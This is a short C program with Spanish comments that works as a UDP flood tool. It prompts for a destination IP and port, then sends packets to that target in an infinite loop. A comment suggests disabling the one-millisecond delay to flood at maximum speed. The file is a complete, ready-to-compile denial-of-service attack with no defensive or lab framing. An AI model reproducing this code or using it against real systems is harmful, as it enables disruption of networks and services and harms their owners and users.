#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

int main() {
    char ip[64];
    int port;
    char msg[] = "UDP flood desde input";

    // Pedir IP y puerto por consola
    printf("Introduce la IP destino: ");
    scanf("%63s", ip);

    printf("Introduce el puerto destino: ");
    scanf("%d", &port);

    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("socket");
        return 1;
    }

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &addr.sin_addr);

    printf("Enviando paquetes UDP infinitamente a %s:%d. Detén con Ctrl+C.\n", ip, port);

    while (1) {
        int sent = sendto(sock, msg, strlen(msg), 0, (struct sockaddr *)&addr, sizeof(addr));
        if (sent < 0) {
            perror("sendto");
            break;
        }
        // Puedes comentar la siguiente línea para máxima velocidad
        //usleep(1000); // Espera 1 milisegundo entre envíos
    }

    close(sock);
    return 0;
}
